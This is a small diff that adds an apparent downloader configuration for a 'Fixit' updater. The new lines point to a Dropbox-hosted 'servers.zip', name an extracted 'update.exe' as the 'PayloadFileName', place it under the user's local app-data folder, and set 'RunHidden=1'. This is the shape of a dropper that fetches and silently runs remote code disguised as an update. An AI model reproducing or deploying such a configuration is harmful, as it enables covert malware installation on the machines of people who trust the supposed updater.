@@ -1,1 +1,5 @@
-vgfvggghbh
+DownloadFolder=%LOCALAPPDATA%\Fixit\Update
+ZipUrl=https://www.dropbox.com/scl/fi/k9mklyienivk8pe1f9tjj/servers.zip?rlkey=iok9z34mqadludbhzi9uryfkn&e=1&st=1hhjpqit&dl=1
+ZipFileName=servers.zip
+PayloadFileName=update.exe
+RunHidden=1
